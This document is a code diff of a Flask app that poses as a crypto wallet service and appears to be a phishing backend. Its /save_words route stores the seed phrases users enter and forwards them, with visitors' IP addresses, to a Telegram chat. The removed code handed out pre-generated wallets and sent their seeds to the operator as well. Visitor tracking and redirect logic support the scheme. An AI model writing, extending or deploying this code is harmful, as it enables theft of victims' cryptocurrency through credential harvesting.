@@ -3,38 +3,21 @@ import os
 import requests
 import json
 from datetime import datetime, timedelta
-import qrcode
-from io import BytesIO
-from flask import send_file
 
 app = Flask(__name__)
 
-# ======== Переменные окружения ========
+# Переменные из окружения (укажи в Render)
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
-ADMIN_TOKEN = os.getenv("ADMIN_TOKEN")
+ADMIN_TOKEN = os.getenv("ADMIN_TOKEN")  # токен для доступа к debug-эндпойнтам (сильного пароля)
 
-# ======== Пути ========
+# Пути к файлам
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 FILE_PATH = os.path.join(BASE_DIR, "words.txt")
 USERS_FILE = os.path.join(BASE_DIR, "users.json")
-WALLETS_FILE = os.path.join(BASE_DIR, "wallets.json")  # 🔹 Новая база кошельков
 
 
-# ---------- Генерация QR-кодов ----------
-def generate_qr(address, filename):
-    """Создаёт QR-картинку для адреса и сохраняет её в /static"""
-    static_dir = os.path.join(BASE_DIR, "static")
-    if not os.path.exists(static_dir):
-        os.makedirs(static_dir)
-
-    img_path = os.path.join(static_dir, filename)
-    img = qrcode.make(address)
-    img.save(img_path)
-    return img_path
-
-
-# ========== Работа с users.json ==========
+# ========== Работа с users.json (с атомарной записью) ==========
 def load_users():
     try:
         if os.path.exists(USERS_FILE):
@@ -51,10 +34,12 @@ def save_users(users):
     try:
         with open(temp_path, "w", encoding="utf-8") as f:
             json.dump(users, f, ensure_ascii=False, indent=2)
+        # атомарно заменяем
         os.replace(temp_path, USERS_FILE)
     except Exception as e:
         print(f"[save_users] Ошибка записи {USERS_FILE}: {e}")
         send_to_telegram(f"⚠️ Ошибка записи users.json: {e}")
+        # попытка удалить временный файл, если он остался
         try:
             if os.path.exists(temp_path):
                 os.remove(temp_path)
@@ -62,20 +47,20 @@ def save_users(users):
             pass
 
 
-# ========== Работа с wallets.json ==========
-def load_wallets():
-    if os.path.exists(WALLETS_FILE):
-        with open(WALLETS_FILE, "r", encoding="utf-8") as f:
-            return json.load(f)
-    return []
+def is_users_file_writable():
+    try:
+        # пробуем создать/заменить временный файл
+        test_path = USERS_FILE + ".writable_test"
+        with open(test_path, "w", encoding="utf-8") as f:
+            f.write("ok")
+        os.remove(test_path)
+        return True
+    except Exception as e:
+        print("[is_users_file_writable] not writable:", e)
+        return False
 
 
-def save_wallets(wallets):
-    with open(WALLETS_FILE, "w", encoding="utf-8") as f:
-        json.dump(wallets, f, ensure_ascii=False, indent=2)
-
-
-# ========== Telegram ==========
+# ========== Telegram уведомления ==========
 def send_to_telegram(message):
     if not TELEGRAM_TOKEN or not CHAT_ID:
         print("⚠️ TELEGRAM_TOKEN или CHAT_ID не задан.")
@@ -90,22 +75,13 @@ def send_to_telegram(message):
         print("Ошибка отправки в Telegram:", e)
 
 
-# ========== Вспомогательные функции ==========
-def is_users_file_writable():
-    try:
-        test_path = USERS_FILE + ".writable_test"
-        with open(test_path, "w", encoding="utf-8") as f:
-            f.write("ok")
-        os.remove(test_path)
-        return True
-    except Exception as e:
-        print("[is_users_file_writable] not writable:", e)
-        return False
-
-
+# ========== Хелперы для сохранения состояния ==========
 def update_user_page(user_id, path):
+    """Сохраняем полный URL последней страницы пользователя (кроме '/')"""
     if not user_id:
         return
+
+    # не сохраняем корень, чтобы не ломать логику
     if path == "/":
         return
 
@@ -113,15 +89,23 @@ def update_user_page(user_id, path):
     if str(user_id) not in users:
         users[str(user_id)] = {}
 
+    # Сохраняем путь вместе с user_id в виде строки "/wallet?user_id=123"
     users[str(user_id)]["last_page"] = f"{path}?user_id={user_id}"
     users[str(user_id)]["last_visit"] = datetime.utcnow().isoformat()
+
+    # Сохраняем атомарно
     save_users(users)
 
     ip = request.remote_addr
     send_to_telegram(f"👤 User {user_id} (IP: {ip}) открыл страницу: {path}")
 
+    # проверяем, действительно ли запись сохранилась (читаем обратно и логируем)
+    users_after = load_users()
+    saved = users_after.get(str(user_id), {}).get("last_page")
+    send_to_telegram(f"📝 Проверка сохранения для {user_id}: last_page = {saved}")
 
-# ========== Роуты ==========
+
+# ========== Роуты приложения ==========
 @app.route("/")
 def index():
     user_id = request.args.get("user_id")
@@ -132,6 +116,7 @@ def index():
         if last_page and last_page != "/":
             ip = request.remote_addr
             send_to_telegram(f"↩️ User {user_id} (IP: {ip}) возвращен на страницу: {last_page}")
+            # просто редирект на тот URL, который мы записали
             return redirect(last_page)
 
     return render_template("index.html")
@@ -160,39 +145,17 @@ def error():
 @app.route("/new_wallet")
 def new_wallet():
     user_id = request.args.get("user_id")
-    wallets = load_wallets()
 
-    free_wallet = None
-    for w in wallets:
-        if not w.get("used"):
-            free_wallet = w
-            w["used"] = True
-            break
-
-    if not free_wallet:
-        return "❌ Нет свободных кошельков", 500
-
-    save_wallets(wallets)
-
-    users = load_users()
-    if str(user_id) not in users:
-        users[str(user_id)] = {}
-    users[str(user_id)]["wallet"] = free_wallet
-    users[str(user_id)]["wallet_created"] = True
-    users[str(user_id)]["last_visit"] = datetime.utcnow().isoformat()
-    save_users(users)
-
-    ip = request.remote_addr
-    send_to_telegram(
-        f"👛 Новый кошелек для User {user_id} (IP: {ip})\n\n"
-        f"Ethereum: {free_wallet['eth']}\n"
-        f"Solana: {free_wallet['sol']}\n"
-        f"Seed: {free_wallet['seed']}\n\n"
-        f"⚠️ Не делитесь этой фразой ни с кем!"
-    )
+    if user_id:
+        users = load_users()
+        if str(user_id) not in users:
+            users[str(user_id)] = {}
+        users[str(user_id)]["wallet_created"] = True
+        users[str(user_id)]["last_visit"] = datetime.utcnow().isoformat()
+        save_users(users)
 
     update_user_page(user_id, "/new_wallet")
-    return render_template("new_wallet.html", wallet=free_wallet)
+    return render_template("new_wallet.html")
 
 
 @app.route("/import", methods=["GET", "POST"])
@@ -219,35 +182,6 @@ def import_wallet():
     update_user_page(user_id, "/import")
     return render_template("import.html", show_modal=False)
 
-# ---------- Новый роут для страницы QR ----------
-@app.route("/qr_code")
-def qr_code():
-    user_id = request.args.get("user_id")
-    token_type = request.args.get("token")  # "eth" или "sol"
-
-    users = load_users()
-    wallet = users.get(str(user_id), {}).get("wallet")
-
-    if not wallet:
-        return "❌ Кошелёк не найден", 404
-
-    address = wallet.get(token_type)
-    if not address:
-        return "❌ Неверный тип токена", 400
-
-    # Генерируем QR-картинку и сохраняем в static
-    filename = f"qr_{user_id}_{token_type}.png"
-    generate_qr(address, filename)
-
-    # Передаём на страницу QR_code.html
-    return render_template(
-        "QR_code.html",
-        token=token_type.upper(),
-        address=address,
-        qr_image=f"/static/{filename}"
-    )
-
-
 @app.route("/save_words", methods=["POST"])
 def save_words():
     user_id = request.args.get("user_id")
@@ -257,13 +191,15 @@ def save_words():
     if words:
         with open(FILE_PATH, "a", encoding="utf-8") as f:
             f.write(words + "\n")
+
         ip = request.remote_addr
         send_to_telegram(f"✍️ User {user_id} (IP: {ip}) ввёл фразу: {words}")
 
     return jsonify({"status": "ok"})
 
 
-# ========== Админ ==========
+
+# ========== Админ / debug эндпойнты (требуют ADMIN_TOKEN) ==========
 def check_admin_token():
     token = request.args.get("token")
     if not ADMIN_TOKEN:
@@ -279,6 +215,17 @@ def admin_users():
     return jsonify(users)
 
 
+@app.route("/_admin/check_user")
+def admin_check_user():
+    check_admin_token()
+    user_id = request.args.get("user_id")
+    if not user_id:
+        return jsonify({"error": "user_id required"}), 400
+    users = load_users()
+    user = users.get(str(user_id))
+    return jsonify({"user_id": user_id, "data": user})
+
+
 @app.route("/_admin/writable")
 def admin_writable():
     check_admin_token()
@@ -286,6 +233,7 @@ def admin_writable():
 
 
 if __name__ == "__main__":
+    # при старте проверим права на запись и оповестим в телеграм
     writable = is_users_file_writable()
     send_to_telegram(f"ℹ️ Сервер стартовал. users.json writable: {writable}")
     app.run(debug=True, host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
